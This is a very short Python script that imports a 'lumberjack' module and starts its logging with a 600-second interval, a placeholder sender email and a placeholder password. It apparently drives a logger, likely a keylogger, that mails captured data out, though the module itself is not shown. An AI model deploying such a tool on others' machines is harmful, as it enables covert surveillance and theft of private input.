import lumberjack

ljack = lumberjack.Lumberjack(600, "<insert source email here>", "<password>")
ljack.start_logging()
